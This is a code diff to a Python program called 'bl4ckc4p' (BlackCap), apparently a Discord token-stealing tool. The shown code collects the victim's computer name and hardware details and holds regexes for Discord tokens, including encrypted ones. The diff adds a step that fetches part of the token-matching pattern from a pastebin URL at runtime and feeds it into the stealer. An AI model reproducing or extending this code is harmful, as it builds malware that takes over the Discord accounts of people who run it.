@@ -105,6 +105,11 @@ vctm_pc = os.getenv("COMPUTERNAME")
 r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
+BlackCap_Regex = 'https://pastebin.com/raw/f4PM9Dse'
+reg_req = requests.get(BlackCap_Regex) 
+clear_reg = r"[\w-]{24}" + reg_req.text
+
+
 
 class Functions(object):
 
@@ -247,7 +252,7 @@ class bl4ckc4p(Functions):
         
         self.baseurl = "https://discord.com/api/v9/users/@me"
 
-        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.regex = clear_reg
 
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
